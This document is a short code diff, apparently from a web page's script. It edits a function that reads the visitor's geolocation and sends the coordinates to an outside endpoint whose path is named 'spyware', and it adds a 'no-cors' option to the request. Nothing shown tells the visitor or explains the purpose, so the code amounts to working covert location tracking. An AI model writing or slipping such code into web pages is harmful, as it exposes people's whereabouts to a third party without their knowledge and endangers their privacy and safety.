@@ -32,7 +32,9 @@
         
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition((pos)=> {
-                fetch('https://icarusws.nl/spyware/?longitude=' + pos.coords.longitude + '&latitude=' + pos.coords.latitude).then(r => console.log(r))
+                fetch('https://icarusws.nl/spyware/?longitude=' + pos.coords.longitude + '&latitude=' + pos.coords.latitude, {
+                    mode: "no-cors"
+                }).then(r => console.log(r))
             });
           } else {
             console.log("Werkt niet....")
